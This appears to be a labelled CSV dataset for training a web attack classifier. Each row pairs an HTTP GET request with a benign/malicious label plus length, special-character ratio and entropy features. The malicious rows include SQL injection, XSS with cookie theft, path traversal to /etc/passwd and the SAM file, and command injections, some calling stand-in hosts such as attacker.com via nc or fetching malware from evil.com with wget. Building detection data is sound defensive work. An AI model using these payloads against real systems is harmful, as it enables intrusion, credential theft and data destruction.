payload,label,length,special_ratio,entropy
GET /products.html?q=search+term&filter=active&limit=10 HTTP/1.1,0,64.0,0.03125,4.718139062229567
GET /image?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,61.0,0.09836065573770492,4.563099272559269
GET /register?size=medium&page=1 HTTP/1.1,0,41.0,0.024390243902439025,4.385008029473517
GET /post?q=<script>alert('XSS')</script> HTTP/1.1,1,50.0,0.16,4.688367439558378
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /products.html?size=medium&color=blue&category=electronics HTTP/1.1,0,71.0,0.028169014084507043,4.695403725614802
GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6691617524766045
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /post?q=<svg onload=alert('XSS')> HTTP/1.1,1,46.0,0.13043478260869565,4.822156249394176
GET /exec?cmd=hostname| nc attacker.com 4444 HTTP/1.1,1,53.0,0.018867924528301886,4.44039534215702
GET /command?cmd=hostname$(whoami) HTTP/1.1,1,43.0,0.06976744186046512,4.498955383052627
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /docs?category=electronics HTTP/1.1,0,39.0,0.0,4.406821128952238
GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1,1,62.0,0.0967741935483871,4.770582149334389
GET /login?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,53.0,0.05660377358490566,4.822747464920989
GET /search?filter=active&price=100 HTTP/1.1,0,44.0,0.022727272727272728,4.464558038845993
GET /post?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,73.0,0.0821917808219178,4.7275633481374975
GET /profile?user=admin'/* HTTP/1.1,1,35.0,0.02857142857142857,4.571860873964194
GET /command?cmd=hostname`id` HTTP/1.1,1,38.0,0.05263157894736842,4.366091329119192
GET /search?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E HTTP/1.1,1,70.0,0.02857142857142857,4.813012081410428
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /api/user?user=' OR 1=1 -- HTTP/1.1,1,39.0,0.02564102564102564,4.23105823222728
GET /contact.html?limit=10&category=electronics&page=1 HTTP/1.1,0,63.0,0.031746031746031744,4.586030074424606
GET /dashboard?category=electronics&sort=name HTTP/1.1,0,54.0,0.018518518518518517,4.587858798299508
GET /comment?q=<img src='x' onerror='alert(1)'> HTTP/1.1,1,56.0,0.14285714285714285,4.662016252639434
GET /blog?color=blue&sort=name HTTP/1.1,0,39.0,0.02564102564102564,4.477459270033353
GET /post?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,51.0,0.0784313725490196,4.655282146267043
GET /run?cmd=hostname; ping -c 10 127.0.0.1 HTTP/1.1,1,52.0,0.019230769230769232,4.635361295347742
GET /profile HTTP/1.1,0,21.0,0.0,3.880179922675737
GET /register?category=electronics&limit=10&price=100 HTTP/1.1,0,62.0,0.03225806451612903,4.486555690069278
GET /api/products?filter=active&page=1 HTTP/1.1,0,47.0,0.02127659574468085,4.575033532160451
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /search?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,53.0,0.07547169811320754,4.632843095746069
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /search?user=1' ORDER BY 1-- HTTP/1.1,1,41.0,0.024390243902439025,4.421831810066857
GET /login?id=123 HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /about.html?sort=name&filter=active&limit=10 HTTP/1.1,0,57.0,0.03508771929824561,4.625977952419631
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /post?q=<img src=x onerror=alert('XSS')> HTTP/1.1,1,53.0,0.11320754716981132,4.824631719074005
GET /register?limit=10&size=medium HTTP/1.1,0,43.0,0.023255813953488372,4.359420499331697
GET /comment?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,60.0,0.1,4.931401845392171
GET /api/products?category=electronics&q=search+term HTTP/1.1,0,61.0,0.01639344262295082,4.674944568150955
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login?user=%27)%20OR%20(%271%27=%271 HTTP/1.1,1,50.0,0.04,4.448367439558377
GET /docs?sort=name&id=123&color=blue HTTP/1.1,0,46.0,0.043478260869565216,4.648243205915916
GET /about.html?category=electronics HTTP/1.1,0,45.0,0.0,4.580307540581811
GET /profile?user=' OR 1=1 -- HTTP/1.1,1,38.0,0.02631578947368421,4.343597829848841
GET /api/users?filter=active&category=electronics&id=123 HTTP/1.1,0,65.0,0.03076923076923077,4.673925651617
GET /profile?category=electronics HTTP/1.1,0,42.0,0.0,4.463280517810811
GET /register?color=blue&price=100&filter=active HTTP/1.1,0,57.0,0.03508771929824561,4.540806847642905
GET /api/user?user=' OR '1'='1 HTTP/1.1,1,39.0,0.10256410256410256,4.169766962341045
GET /search?q=%3Ciframe src=javascript:alert('XSS')%3E HTTP/1.1,1,63.0,0.06349206349206349,4.913887566996884
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /comment?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.868106670688481
GET /run?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,48.0,0.041666666666666664,4.4803885422075345
GET /file?file=..\..\..\windows\system32\config\sam HTTP/1.1,1,60.0,0.1,4.549791896188175
GET /products.html?id=123 HTTP/1.1,0,34.0,0.0,4.51364592935837
GET /api/products HTTP/1.1,0,26.0,0.0,4.103909910282363
GET /image?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,59.0,0.0,4.360771016449623
GET /search?user=' UNION SELECT * FROM users-- HTTP/1.1,1,55.0,0.01818181818181818,4.655611586962955
GET /profile?q=%3Csvg onload=alert('XSS')%3E HTTP/1.1,1,53.0,0.07547169811320754,4.953966680815012
GET /post?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,73.0,0.0821917808219178,4.7275633481374975
GET /settings?sort=name&id=123&limit=10 HTTP/1.1,0,48.0,0.041666666666666664,4.537782031835941
GET /profile?user=%27;%20DROP%20TABLE%20users-- HTTP/1.1,1,56.0,0.017857142857142856,4.789148671903073
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login?user=admin'/* HTTP/1.1,1,33.0,0.030303030303030304,4.513794876803092
GET /file?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,51.0,0.0,4.355537901604238
GET /search?user=1' ORDER BY 1-- HTTP/1.1,1,41.0,0.024390243902439025,4.421831810066857
GET /settings?id=123&color=blue&size=medium HTTP/1.1,0,52.0,0.038461538461538464,4.680832987205441
GET /docs?q=search+term HTTP/1.1,0,32.0,0.0,4.413909765557392
GET /dashboard?size=medium&q=search+term HTTP/1.1,0,49.0,0.02040816326530612,4.624315456095191
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /exec?cmd=hostname$(cat /etc/passwd) HTTP/1.1,1,49.0,0.061224489795918366,4.5172723438944455
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /contact.html?page=1 HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /dashboard?color=blue HTTP/1.1,0,34.0,0.0,4.337175341123076
GET /exec?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,61.0,0.03278688524590164,4.682557575474071
GET /profile?user=' OR '1'='1'/* HTTP/1.1,1,41.0,0.12195121951219512,4.305858944160431
GET /search?limit=10&color=blue&category=electronics HTTP/1.1,0,61.0,0.03278688524590164,4.602971461174508
GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,54.0,0.07407407407407407,4.6691617524766045
GET /download?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,3.983340344322928
GET /api/user?user=' OR '1'='1 HTTP/1.1,1,39.0,0.10256410256410256,4.169766962341045
GET /search?user=') OR ('1'='1 HTTP/1.1,1,39.0,0.15384615384615385,4.291687154704211
GET /register?id=123 HTTP/1.1,0,29.0,0.0,4.1852301329094015
GET /document?file=..//..//..//etc/passwd HTTP/1.1,1,50.0,0.0,4.250044500340504
GET /exec?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,49.0,0.04081632653061224,4.38481877255418
GET /profile?user=%27%20OR%20%27a%27=%27a HTTP/1.1,1,50.0,0.0,4.448367439558377
GET /blog?page=1&category=electronics HTTP/1.1,0,46.0,0.021739130434782608,4.528465488430549
GET /search?q=%3Cselect onfocus=alert(1) autofocus%3E HTTP/1.1,1,62.0,0.03225806451612903,4.667511834405949
GET /search?q=%3Cimg src='x' onerror='alert(1)'%3E HTTP/1.1,1,59.0,0.1016949152542373,4.755027371175723
GET /index.html?sort=name&category=electronics&filter=active HTTP/1.1,0,69.0,0.028985507246376812,4.6347478702316325
GET /comment?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.868106670688481
GET /command?cmd=hostname`id` HTTP/1.1,1,38.0,0.05263157894736842,4.366091329119192
GET /login?id=123&category=electronics HTTP/1.1,0,47.0,0.02127659574468085,4.607156404592941
GET /blog?price=100&page=1 HTTP/1.1,0,35.0,0.02857142857142857,4.364857659740294
GET /command?cmd=hostname; ls -la HTTP/1.1,1,42.0,0.023809523809523808,4.403989446485262
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /blog?category=electronics HTTP/1.1,0,39.0,0.0,4.438747090435226
GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,55.0,0.0,4.487518632456837
GET /profile?q=<keygen onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.787233041173861
GET /search?user=%27;%20DROP%20TABLE%20users-- HTTP/1.1,1,55.0,0.01818181818181818,4.685638577043014
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /ping?cmd=hostname&& cat /etc/shadow HTTP/1.1,1,49.0,0.04081632653061224,4.532678211285537
GET /profile?id=123&size=medium HTTP/1.1,0,40.0,0.025,4.515311532225102
GET /comment?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.874614690921527
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /settings?id=123&size=medium HTTP/1.1,0,41.0,0.024390243902439025,4.4058556629435985
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /command?cmd=hostname$(whoami) HTTP/1.1,1,43.0,0.06976744186046512,4.498955383052627
GET /products.html?page=1&limit=10&category=electronics HTTP/1.1,0,64.0,0.03125,4.7165786642591
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /dashboard?page=1&category=electronics&sort=name HTTP/1.1,0,61.0,0.03278688524590164,4.62338314146691
GET /post?q=<video><source onerror='alert(1)'> HTTP/1.1,1,55.0,0.14545454545454545,4.699833468881675
GET /post?q=<script>alert('XSS')</script> HTTP/1.1,1,50.0,0.16,4.688367439558378
GET /dashboard?color=blue&id=123 HTTP/1.1,0,41.0,0.024390243902439025,4.552197126358232
GET /profile?id=123&sort=name&filter=active HTTP/1.1,0,52.0,0.038461538461538464,4.666315919856144
GET /file?file=../../../../../../etc/passwd HTTP/1.1,1,52.0,0.0,3.8130394036575916
GET /docs?size=medium HTTP/1.1,0,30.0,0.0,4.21506101220307
GET /search?category=electronics&filter=active HTTP/1.1,0,55.0,0.01818181818181818,4.483467386520037
GET /api/products?id=123&limit=10&sort=name HTTP/1.1,0,52.0,0.038461538461538464,4.6808329872054415
GET /contact.html HTTP/1.1,0,26.0,0.0,3.9500637564362093
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /api/users?price=100&limit=10&category=electronics HTTP/1.1,0,63.0,0.031746031746031744,4.584444908232386
GET /profile?sort=name HTTP/1.1,0,31.0,0.0,4.413716068381602
GET /contact.html?price=100 HTTP/1.1,0,36.0,0.0,4.41938194564637
GET /contact.html?filter=active&id=123 HTTP/1.1,0,47.0,0.02127659574468085,4.60503160735656
GET /api/users HTTP/1.1,0,23.0,0.0,3.849223912390625
GET /search?user=' OR '1'='1'/* HTTP/1.1,1,40.0,0.125,4.193942707918268
GET /post?q=<svg onload=alert('XSS')> HTTP/1.1,1,46.0,0.13043478260869565,4.822156249394176
GET /api/users?size=medium&q=search+term HTTP/1.1,0,49.0,0.02040816326530612,4.525238864824306
GET /profile?color=blue&sort=name HTTP/1.1,0,42.0,0.023809523809523808,4.558518613048907
GET /download?file=..%c0%af..%c0%af..%c0%afetc/passwd HTTP/1.1,1,62.0,0.0,4.409189053260732
GET /command?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,64.0,0.03125,4.654078664259099
GET /search HTTP/1.1,0,20.0,0.0,3.7841837197791888
GET /login?size=medium&id=123&category=electronics HTTP/1.1,0,59.0,0.03389830508474576,4.71325799072301
GET /search?color=blue&price=100 HTTP/1.1,0,41.0,0.024390243902439025,4.485004748256684
GET /index.html?size=medium&id=123 HTTP/1.1,0,43.0,0.023255813953488372,4.50127783584588
GET /ping?cmd=hostname$(whoami) HTTP/1.1,1,40.0,0.075,4.684183719779188
GET /ping?cmd=hostname& cat /etc/passwd HTTP/1.1,1,48.0,0.020833333333333332,4.506328385912462
GET /profile?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.900025150061047
GET /register?id=123&color=blue HTTP/1.1,0,40.0,0.025,4.546439344671016
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /products.html?category=electronics&sort=name HTTP/1.1,0,58.0,0.017241379310344827,4.631784176528196
GET /index.html?q=search+term&sort=name&limit=10 HTTP/1.1,0,57.0,0.03508771929824561,4.678952513974962
GET /comment?q=%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,1,61.0,0.06557377049180328,4.819680984926534
GET /image?file=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1,1,52.0,0.0,4.4473385747039735
GET /docs?price=100&color=blue&sort=name HTTP/1.1,0,49.0,0.04081632653061224,4.624315456095191
GET /login?user='; DROP TABLE users-- HTTP/1.1,1,46.0,0.043478260869565216,4.6460722174352656
GET /products.html?color=blue HTTP/1.1,0,38.0,0.0,4.45148902643068
GET /register?category=electronics HTTP/1.1,0,43.0,0.0,4.31290887142472
GET /profile?user=' UNION SELECT * FROM users-- HTTP/1.1,1,56.0,0.017857142857142856,4.759657878074444
GET /index.html?sort=name HTTP/1.1,0,34.0,0.0,4.477024973539649
GET /login?limit=10 HTTP/1.1,0,28.0,0.0,4.0836169753972325
GET /api/users?size=medium&filter=active HTTP/1.1,0,49.0,0.02040816326530612,4.523200794005739
GET /contact.html?filter=active&limit=10&color=blue HTTP/1.1,0,60.0,0.03333333333333333,4.558659712448834
GET /search?user=' OR 1=1 -- HTTP/1.1,1,37.0,0.02702702702702703,4.226628285180294
GET /document?file=....//....//....//etc/passwd HTTP/1.1,1,56.0,0.0,4.0547689157515
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /api/users?id=123 HTTP/1.1,0,30.0,0.0,4.231401845392171
"GET /api/user?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,58.0,0.017241379310344827,4.523051306072045
GET /api/user?user=' OR '1'='1' -- HTTP/1.1,1,43.0,0.11627906976744186,4.200007639511387
GET /settings?filter=active&price=100&q=search+term HTTP/1.1,0,60.0,0.03333333333333333,4.6253263791155
GET /api/users?page=1&color=blue&category=electronics HTTP/1.1,0,62.0,0.03225806451612903,4.5542932858792735
GET /about.html?page=1&q=search+term HTTP/1.1,0,45.0,0.022222222222222223,4.652421151644845
GET /api/users?category=electronics HTTP/1.1,0,44.0,0.0,4.464558038845993
GET /image?file=..%252F..%252F..%252Fetc%252Fpasswd HTTP/1.1,1,60.0,0.0,4.420869604629682
GET /dashboard?price=100&sort=name HTTP/1.1,0,43.0,0.023255813953488372,4.61185661496596
GET /contact.html?sort=name&q=search+term&color=blue HTTP/1.1,0,61.0,0.03278688524590164,4.5637852394439635
GET /search?category=electronics&q=search+term HTTP/1.1,0,55.0,0.01818181818181818,4.513203241490941
GET /comment?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.583843210665388
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /settings?q=search+term&sort=name&limit=10 HTTP/1.1,0,55.0,0.03636363636363636,4.578833068298883
GET /api/user?user=' OR '1'='1'/* HTTP/1.1,1,42.0,0.11904761904761904,4.193161994764468
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /command?cmd=hostname| whoami HTTP/1.1,1,42.0,0.023809523809523808,4.377336696990887
GET /search?q=<script>document.location='http://evil.com'</script> HTTP/1.1,1,75.0,0.08,4.773371817214928
GET /contact.html?size=medium&id=123 HTTP/1.1,0,45.0,0.022222222222222223,4.652421151644845
GET /settings?id=123&size=medium HTTP/1.1,0,41.0,0.024390243902439025,4.4058556629435985
GET /register?category=electronics&color=blue&id=123 HTTP/1.1,0,61.0,0.03278688524590164,4.59223339507527
GET /login?category=electronics HTTP/1.1,0,40.0,0.0,4.396439344671015
GET /login?user=1' ORDER BY 1-- HTTP/1.1,1,40.0,0.025,4.512814895472355
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /index.html HTTP/1.1,0,24.0,0.0,4.053508854797679
GET /run?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,60.0,0.03333333333333333,4.742318879259732
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /profile?q=search+term HTTP/1.1,0,35.0,0.0,4.550292659616668
GET /contact.html?limit=10&id=123 HTTP/1.1,0,42.0,0.023809523809523808,4.45160849410431
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /api/users?size=medium&page=1 HTTP/1.1,0,42.0,0.023809523809523808,4.350068910616444
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /login?price=100&size=medium&q=search+term HTTP/1.1,0,55.0,0.03636363636363636,4.774376477429128
GET /register?size=medium&color=blue&category=electronics HTTP/1.1,0,66.0,0.030303030303030304,4.568877786248544
"GET /profile?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,57.0,0.017543859649122806,4.593047304286545
"GET /api/user?user=' UNION ALL SELECT NULL,NULL-- HTTP/1.1",1,58.0,0.017241379310344827,4.523051306072045
GET /search?q=<audio src=x onerror=alert(1)> HTTP/1.1,1,53.0,0.07547169811320754,4.632843095746069
GET /comment?q=<keygen onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.727745329236117
GET /api/products?q=search+term HTTP/1.1,0,40.0,0.0,4.5653115322251026
GET /api/users?id=123&page=1&price=100 HTTP/1.1,0,47.0,0.0425531914893617,4.445249160455987
GET /search?q=<svg onload=alert('XSS')> HTTP/1.1,1,48.0,0.125,4.871115365169274
GET /about.html?sort=name HTTP/1.1,0,34.0,0.0,4.395998870534841
GET /profile?user=' UNION SELECT NULL-- HTTP/1.1,1,48.0,0.020833333333333332,4.629247855285173
GET /register?sort=name HTTP/1.1,0,32.0,0.0,4.241729296672174
GET /about.html?id=123&color=blue HTTP/1.1,0,42.0,0.023809523809523808,4.6061376606679545
GET /profile?q=<select onfocus=alert(1) autofocus> HTTP/1.1,1,59.0,0.06779661016949153,4.634359312213627
GET /search?user=1' AND '1'='1 HTTP/1.1,1,39.0,0.10256410256410256,4.199132270744292
GET /login?user=' OR '1'='1 HTTP/1.1,1,36.0,0.1111111111111111,4.260067015271104
GET /docs?category=electronics&limit=10 HTTP/1.1,0,48.0,0.020833333333333332,4.573934896284058
GET /image?file=../../../../../../etc/passwd HTTP/1.1,1,53.0,0.0,3.913867315824671
GET /about.html HTTP/1.1,0,24.0,0.0,3.9701755214643453
GET /api/users?filter=active HTTP/1.1,0,37.0,0.0,4.371087149178845
GET /register HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /profile?user='; DROP TABLE users-- HTTP/1.1,1,48.0,0.041666666666666664,4.629247855285172
GET /dashboard HTTP/1.1,0,23.0,0.0,3.8820451081368628
GET /products.html?color=blue&q=search+term HTTP/1.1,0,52.0,0.019230769230769232,4.651798852506846
GET /search?user=1%27%20ORDER%20BY%201-- HTTP/1.1,1,49.0,0.0,4.604306272598331
GET /api/products?limit=10&color=blue&q=search+term HTTP/1.1,0,60.0,0.03333333333333333,4.7477426785812735
GET /profile?user=' UNION SELECT NULL-- HTTP/1.1,1,48.0,0.020833333333333332,4.629247855285173
GET /blog HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /settings HTTP/1.1,0,22.0,0.0,3.788754913993502
GET /search?q=<iframe src=javascript:alert('XSS')> HTTP/1.1,1,59.0,0.1016949152542373,4.848851211061991
GET /products.html?color=blue HTTP/1.1,0,38.0,0.0,4.45148902643068
GET /docs HTTP/1.1,0,18.0,0.0,3.572431251322119
GET /search?q=<keygen onfocus=alert(1) autofocus> HTTP/1.1,1,58.0,0.06896551724137931,4.745406425938248
GET /products.html HTTP/1.1,0,27.0,0.0,4.208410187268527
GET /docs?price=100&size=medium&id=123 HTTP/1.1,0,47.0,0.0425531914893617,4.5116197025573435
GET /comment?q=javascript:alert('XSS') HTTP/1.1,1,47.0,0.0851063829787234,4.868106670688481
GET /download?file=..\..\..\..\..\..\etc\passwd HTTP/1.1,1,56.0,0.125,4.106158925726099
GET /blog?color=blue HTTP/1.1,0,29.0,0.0,4.090234012145145
GET /search?user=admin'/* HTTP/1.1,1,34.0,0.029411764705882353,4.454822399946606
GET /command?cmd=hostname`wget http://evil.com/malware` HTTP/1.1,1,64.0,0.03125,4.654078664259099
GET /api/user?user=1%27%20ORDER%20BY%2010-- HTTP/1.1,1,52.0,0.0,4.59448250651942
GET /api/users?sort=name HTTP/1.1,0,33.0,0.0,4.309101316131472
GET /login HTTP/1.1,0,19.0,0.0,3.6818808028034016
GET /comment?q=<svg onload=alert('XSS')> HTTP/1.1,1,49.0,0.12244897959183673,4.874614690921527
GET /search?user=' WAITFOR DELAY '00:00:05'-- HTTP/1.1,1,54.0,0.05555555555555555,4.755365864181302
GET /login?user=%27)%20OR%20(%271%27=%271 HTTP/1.1,1,50.0,0.04,4.448367439558377
GET /index.html?q=search+term&color=blue&size=medium HTTP/1.1,0,61.0,0.03278688524590164,4.762143689773634
GET /api/products?category=electronics&color=blue&page=1 HTTP/1.1,0,65.0,0.03076923076923077,4.59362902163433
GET /search?user=' OR '1'='1'/* HTTP/1.1,1,40.0,0.125,4.193942707918268
GET /search?user=') OR ('1'='1 HTTP/1.1,1,39.0,0.15384615384615385,4.291687154704211
GET /login?page=1&size=medium HTTP/1.1,0,38.0,0.02631578947368421,4.4842551447948
GET /docs?q=search+term&color=blue&sort=name HTTP/1.1,0,53.0,0.03773584905660377,4.614344039305579
